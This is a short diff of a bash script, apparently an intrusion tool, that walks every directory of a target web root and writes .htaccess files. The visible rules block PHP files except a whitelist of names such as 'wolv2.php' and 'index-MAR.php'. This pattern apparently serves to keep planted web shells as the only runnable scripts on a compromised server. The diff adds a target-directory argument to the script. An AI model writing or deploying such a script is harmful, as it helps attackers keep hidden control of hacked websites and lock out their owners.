@@ -1,5 +1,11 @@
 #!/bin/bash
 
+if [ -z "$1" ]; then
+  echo "Penggunaan: bash ht.sh /path/to/directory"
+  exit 1
+fi
+
+TARGET_DIR="$1"
 create_htaccess_content() {
 cat <<EOL
 <Files *.ph*>
@@ -36,7 +42,7 @@ cat <<EOL
     Allow from all
 </FilesMatch>
 
-<FilesMatch "^(index.html|index-MAR.php|wolv2.php)$">
+<FilesMatch "^(index.html|index-MAR.php|wolv2.php|)$">
     Order allow,deny
     Allow from all
 </FilesMatch>
@@ -56,4 +62,5 @@ create_htaccess() {
 export -f create_htaccess
 export -f create_htaccess_content
 
-find . -type d -exec bash -c 'create_htaccess "$0"' {} \;
+find "$TARGET_DIR" -type d -exec bash -c 'create_htaccess "$0"' {} \;
+
